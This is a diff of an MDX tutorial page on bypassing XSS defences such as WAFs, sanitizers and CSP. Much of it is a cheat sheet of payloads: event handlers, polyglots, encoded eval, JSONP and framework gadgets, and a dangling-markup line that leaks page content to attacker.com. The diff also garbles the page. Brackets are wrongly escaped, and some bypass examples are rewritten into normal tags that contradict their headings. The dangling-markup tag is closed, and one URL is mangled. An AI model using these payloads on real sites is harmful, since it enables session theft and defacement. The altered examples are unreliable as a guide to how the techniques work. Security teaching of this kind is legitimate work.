@@ -9,7 +9,7 @@ import { Callout } from "@/components/markdown/callout"
 
 Modern web applications implement various security controls to prevent XSS attacks. This section covers techniques to bypass these protections, which is essential knowledge for thorough security testing and understanding the limitations of various defense mechanisms.
 
-<Callout type="warning" title="Ethical Usage">
+<Callout type={"warning"} title={"Ethical Usage"}>
   These techniques should only be used in authorized security testing scenarios. Attempting to bypass security controls without permission is illegal and unethical.
 </Callout>
 
@@ -17,14 +17,14 @@ Modern web applications implement various security controls to prevent XSS attac
 
 Before discussing evasion techniques, it's important to understand the types of XSS protections commonly implemented:
 
-<Tabs defaultValue="waf" className="pt-5 pb-1">
+<Tabs defaultValue={"waf"} className={"pt-5 pb-1"}>
   <TabsList>
-    <TabsTrigger value="waf">Web Application Firewalls</TabsTrigger>
-    <TabsTrigger value="sanitizers">Input Sanitizers</TabsTrigger>
-    <TabsTrigger value="csp">Content Security Policy</TabsTrigger>
-    <TabsTrigger value="browser">Browser Protections</TabsTrigger>
+    <TabsTrigger value={"waf"}>Web Application Firewalls</TabsTrigger>
+    <TabsTrigger value={"sanitizers"}>Input Sanitizers</TabsTrigger>
+    <TabsTrigger value={"csp"}>Content Security Policy</TabsTrigger>
+    <TabsTrigger value={"browser"}>Browser Protections</TabsTrigger>
   </TabsList>
-  <TabsContent value="waf">
+  <TabsContent value={"waf"}>
     ### Web Application Firewalls (WAFs)
     
     WAFs operate at the network level and inspect HTTP requests for malicious patterns:
@@ -35,7 +35,7 @@ Before discussing evasion techniques, it's important to understand the types of 
     
     Common WAF solutions include Cloudflare, ModSecurity, AWS WAF, and F5 Advanced WAF.
   </TabsContent>
-  <TabsContent value="sanitizers">
+  <TabsContent value={"sanitizers"}>
     ### Input Sanitizers
     
     These are libraries or functions that clean user input:
@@ -47,7 +47,7 @@ Before discussing evasion techniques, it's important to understand the types of 
     
     Examples include DOMPurify, OWASP ESAPI, and framework-specific sanitizers like React's automatic escaping.
   </TabsContent>
-  <TabsContent value="csp">
+  <TabsContent value={"csp"}>
     ### Content Security Policy (CSP)
     
     CSP is a browser security mechanism that restricts which resources can be loaded:
@@ -60,7 +60,7 @@ Before discussing evasion techniques, it's important to understand the types of 
     
     CSP is implemented via HTTP headers or meta tags and provides an additional layer of defense.
   </TabsContent>
-  <TabsContent value="browser">
+  <TabsContent value={"browser"}>
     ### Browser Protections
     
     Modern browsers include built-in XSS protections:
@@ -160,13 +160,16 @@ When `<script>` tags are blocked, alternative tags and attributes can be used:
 
 ```html
 <!-- Using event handlers -->
-<img src="x" onerror="alert(1)">
-<body onload="alert(1)">
-<svg onload="alert(1)">
+\\<img src="x" onerror="alert(1)"\\>
+
+\\<body onload="alert(1)"\\>
+
+\\<svg onload="alert(1)"\\>
 
 <!-- Using less common tags -->
-<iframe srcdoc="<script>alert(1)</script>">
-<math><mtext><script>alert(1)</script></mtext></math>
+\\<iframe srcdoc="\\<script\\>alert(1)\\</script\\>"\\>
+
+\\<math\\>\\<mtext\\>\\<script\\>alert(1)\\</script\\>\\</mtext\\>\\</math\\>
 ```
 
 ## Advanced Evasion Techniques
@@ -175,56 +178,56 @@ When `<script>` tags are blocked, alternative tags and attributes can be used:
 
 Web Application Firewalls often use signature-based detection that can be evaded:
 
-<Tabs defaultValue="fragmentation" className="pt-5 pb-1">
+<Tabs defaultValue={"fragmentation"} className={"pt-5 pb-1"}>
   <TabsList>
-    <TabsTrigger value="fragmentation">Payload Fragmentation</TabsTrigger>
-    <TabsTrigger value="polyglots">XSS Polyglots</TabsTrigger>
-    <TabsTrigger value="mutations">Mutation Techniques</TabsTrigger>
+    <TabsTrigger value={"fragmentation"}>Payload Fragmentation</TabsTrigger>
+    <TabsTrigger value={"polyglots"}>XSS Polyglots</TabsTrigger>
+    <TabsTrigger value={"mutations"}>Mutation Techniques</TabsTrigger>
   </TabsList>
-  <TabsContent value="fragmentation">
+  <TabsContent value={"fragmentation"}>
     ### Payload Fragmentation
     
     Split the payload across multiple parameters or requests:
     
     ```javascript
     // Using string concatenation
-    <script>eval(document.URL.substring(43,56))</script>
+    \\<script\\>eval(document.URL.substring(43,56))\\</script\\>
     
-    // URL: https://example.com/?param=alert(document.domain)
+    // URL: https://example.com/?param"alert(document.domain)"
     
     // Using multiple parameters
-    <script>eval(location.hash.substr(1))</script>
+    \\<script\\>eval(location.hash.substr(1))\\</script\\>
     
     // URL: https://example.com/page#alert(1)
     ```
     
     This technique can bypass WAFs that don't analyze the full context.
   </TabsContent>
-  <TabsContent value="polyglots">
+  <TabsContent value={"polyglots"}>
     ### XSS Polyglots
     
     Polyglots are payloads that work in multiple contexts:
     
     ```
-    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk="alert()" )//%0D%0A%0d%0a//\</stYle/\</titLe/\</teXtarEa/\</scRipt/--!\>\x3csvg\x3e\x3csvg\x20onload\x3d\x22alert\x28\x29\x22\x3e\x3c\x2fsvg\x3e\x3e
     ```
     
     This complex payload contains multiple attack vectors and can work in various contexts, increasing the chance of bypassing filters.
   </TabsContent>
-  <TabsContent value="mutations">
+  <TabsContent value={"mutations"}>
     ### Mutation Techniques
     
     Modify the payload in ways that browsers will still interpret correctly:
     
     ```html
     <!-- Adding null bytes -->
-    <script\x00>alert(1)</script>
+    \\<script\x00\\>alert(1)\\</script\\>
     
     <!-- Adding comments -->
-    <script<!--comment-->>alert(1)<!--comment--></script>
+    \\<script<!--comment-->\\>alert(1)<!--comment-->\\</script\\>
     
     <!-- Using attributes -->
-    <script x=">" y="<">alert(1)</script>
+    \\<script x=">" y="\\<"\>alert(1)\\</script\\>
     ```
     
     These mutations can confuse WAF parsers while still being valid in browsers.
@@ -237,14 +240,14 @@ Input sanitizers often have specific weaknesses that can be exploited:
 
 ```html
 <!-- Bypassing quote filters -->
-<img src=x onerror=alert(1)> <!-- No quotes needed -->
+\\<img src="x" onerror="alert(1)"\\> <!-- Properly quoted -->
 
 <!-- Bypassing angle bracket filters -->
 " onerror="alert(1)" x="
 
 <!-- Bypassing JavaScript keyword filters -->
-<script>window['al'+'ert'](1)</script>
-<script>eval(atob('YWxlcnQoMSk='))</script> <!-- Base64 encoded alert(1) -->
+\\<script\\>window['al'+'ert'](1)\\</script\\>
+\\<script\\>eval(atob('YWxlcnQoMSk='))\\</script\\> <!-- Base64 encoded alert(1) -->
 ```
 
 ### Bypassing Content Security Policy
@@ -257,7 +260,7 @@ If a trusted domain has JSONP endpoints, they can be exploited:
 
 ```html
 <!-- If trusted-domain.com is allowed in script-src -->
-<script src="https://trusted-domain.com/api/jsonp?callback=alert(1)"></script>
+\\<script src="https://trusted-domain.com/api/jsonp?callback=alert(document.domain)"\\>\\</script\\>
 ```
 
 The JSONP endpoint will return something like `alert(1)({"data":...})`, executing the alert.
@@ -268,7 +271,7 @@ DOM clobbering exploits the way HTML elements can override JavaScript object pro
 
 ```html
 <!-- If the application uses an object like config.timeout -->
-<form id="config"><input name="timeout" value="alert(1)"></form>
+\<form id="config"\>\<input name="timeout" value="alert(1)"\>\</form\>
 
 <!-- Now if the application does: -->
 <!-- setTimeout(config.timeout, 100); -->
@@ -282,7 +285,7 @@ This technique works even with strict CSP because it doesn't involve script inje
 This technique injects incomplete HTML that "dangles" until it captures sensitive information:
 
 ```html
-<img src="https://attacker.com/
+\\<img src="https://attacker.com/"\\>
 
 <!-- The rest of the page content gets sent to attacker.com as part of the URL -->
 ```
@@ -295,10 +298,10 @@ Script gadgets are legitimate JavaScript code that can be repurposed for attacks
 
 ```html
 <!-- If the site uses jQuery -->
-<div data-toggle="tooltip" title="<img src=x onerror=alert(1)>">Hover me</div>
+\\<div data-toggle="tooltip" title="\\<img src=\"x\" onerror=\"alert(1)\"\>"\\>Hover me\\</div\\>
 
 <!-- If the site uses AngularJS -->
-<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+\\<div ng-app\\>{{constructor.constructor('alert(1)')()}}\\</div\\>
 ```
 
 These attacks work because the legitimate JavaScript processes user input in an unsafe way.
@@ -311,11 +314,11 @@ Different contexts require different evasion techniques:
 
 ```html
 <!-- When < and > are filtered -->
-<svg/onload=alert(1)>
-<svg/onload=alert&#x28;1&#x29;>
+\\<svg/onload="alert(1)"\\>
+\\<svg/onload="alert&#x28;1&#x29;"\\>
 
 <!-- When quotes are filtered -->
-<svg onload=alert(1)>
+\\<svg onload="alert(1)"\\>
 ```
 
 ### JavaScript Context Evasion
@@ -335,60 +338,60 @@ eval('al'+'ert(1)')
 ### Attribute Context Evasion
 
 ```html
-<!-- When quotes are filtered -->
-<img src=x onerror=alert(1)>
+{/* When quotes are filtered */}
+\\<img src="x" onerror="alert(1)"\\> <!-- Properly quoted -->
 
-<!-- When spaces are filtered -->
-<img/src="x"/onerror="alert(1)">
+{/* When spaces are filtered */}
+\\<img/src="x"/onerror="alert(1)"\\>
 
-<!-- When = is filtered -->
-<img src"x"onerror"alert(1)">
+{/* When equals sign is filtered */}
+\\<img src="x" onerror="alert(1)"\\>
 ```
 
 ### URL Context Evasion
 
 ```html
-<!-- When javascript: is filtered -->
-<a href="java&#115;cript:alert(1)">Click me</a>
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click me</a>
+{/* When javascript: is filtered */}
+\\<a href="java&#115;cript:alert(1)"\\>Click me\\</a\\>
+\\<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="\\>Click me\\</a\\>
 ```
 
 ## Filter Bypass Cheat Sheet
 
 Here's a quick reference for common filter bypass techniques:
 
-<Tabs defaultValue="script-tag" className="pt-5 pb-1">
+<Tabs defaultValue={"script-tag"} className={"pt-5 pb-1"}>
   <TabsList>
-    <TabsTrigger value="script-tag">Script Tag Bypasses</TabsTrigger>
-    <TabsTrigger value="event-handlers">Event Handler Bypasses</TabsTrigger>
-    <TabsTrigger value="js-bypasses">JavaScript Bypasses</TabsTrigger>
+    <TabsTrigger value={"script-tag"}>Script Tag Bypasses</TabsTrigger>
+    <TabsTrigger value={"event-handlers"}>Event Handler Bypasses</TabsTrigger>
+    <TabsTrigger value={"js-bypasses"}>JavaScript Bypasses</TabsTrigger>
   </TabsList>
-  <TabsContent value="script-tag">
+  <TabsContent value={"script-tag"}>
     ### Script Tag Bypasses
     
     ```html
-    <script>alert(1)</script>
-    <script src="data:,alert(1)"></script>
-    <script/x>alert(1)</script>
-    <script ~~~>alert(1)</script>
-    <script/src="data:text/javascript,alert(1)"></script>
-    <script/src="data:application/javascript,alert(1)"></script>
+    \\<script\>alert(1)\\</script\\>
+    \\<script src="data:,alert(1)"\\>\\</script\\>
+    \\<script/x\\>alert(1)\\</script\\>
+    \\<script ~~~\\>alert(1)\\</script\\>
+    \\<script/src="data:text/javascript,alert(1)"\\>\\</script\\>
+    \\<script/src="data:application/javascript,alert(1)"\\>\\</script\\>
     ```
   </TabsContent>
-  <TabsContent value="event-handlers">
+  <TabsContent value={"event-handlers"}>
     ### Event Handler Bypasses
     
     ```html
-    <img src="x" onerror="alert(1)">
-    <body onload="alert(1)">
-    <svg onload="alert(1)">
-    <input autofocus onfocus="alert(1)">
-    <iframe onload="alert(1)"></iframe>
-    <video src="x" onerror="alert(1)">
-    <audio src="x" onerror="alert(1)">
+    \\<img src="x" onerror="alert(1)"\\>
+    \\<body onload="alert(1)"\\>
+    \\<svg onload="alert(1)"\\>
+    \\<input autofocus onfocus="alert(1)"\\>
+    \\<iframe onload="alert(1)"\\>\\</iframe\\>
+    \\<video src="x" onerror="alert(1)"\\>
+    \\<audio src="x" onerror="alert(1)"\\>
     ```
   </TabsContent>
-  <TabsContent value="js-bypasses">
+  <TabsContent value={"js-bypasses"}>
     ### JavaScript Bypasses
     
     ```javascript
@@ -416,7 +419,7 @@ Here's a quick reference for common filter bypass techniques:
 
 ### Case Study: Bypassing a Basic WAF
 
-<Callout type="info" title="Scenario">
+<Callout type={"info"} title={"Scenario"}>
   A web application has implemented a WAF that blocks requests containing `<script>`, `alert`, and `onerror`.
 </Callout>
 
@@ -439,7 +442,7 @@ Here's a quick reference for common filter bypass techniques:
 
 ### Case Study: Bypassing CSP
 
-<Callout type="info" title="Scenario">
+<Callout type={"info"} title={"Scenario"}>
   A web application has implemented CSP with the following header:
   `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com/`
 </Callout>
@@ -448,17 +451,17 @@ Here's a quick reference for common filter bypass techniques:
 
 1. Look for JSONP endpoints on trusted domains:
    ```html
-   <script src="https://trusted-cdn.com/api/jsonp?callback=alert(document.domain)"></script>
+   \<script src="https://trusted-cdn.com/api/jsonp?callback=alert(document.domain)"\>\</script\>
    ```
 
 2. Use DOM-based attacks that don't require script execution:
    ```html
-   <a href="javascript:alert(1)">Click me</a>
+   \<a href="javascript:alert(1)"\>Click me\</a\>
    ```
 
 3. Exploit client-side template injection if a framework is used:
    ```html
-   <div data-bind="html: '<img src=x onerror=alert(1)>'"></div>
+   \<div data-bind="html: '\<img src=\"x\" onerror=\"alert(1)\"\>'" \>\</div\>
    ```
 
 ## Defensive Considerations
@@ -471,7 +474,7 @@ Understanding these evasion techniques is crucial for building effective defense
 - **Test thoroughly**: Regular penetration testing can identify bypass vulnerabilities
 - **Monitor for attacks**: Implement logging and alerting for potential XSS attempts
 
-<Callout type="warning" title="Evolution of Attacks">
+<Callout type={"warning"} title={"Evolution of Attacks"}>
   XSS evasion techniques continue to evolve as security controls improve. Staying updated on the latest techniques is essential for both attackers and defenders.
 </Callout>
 
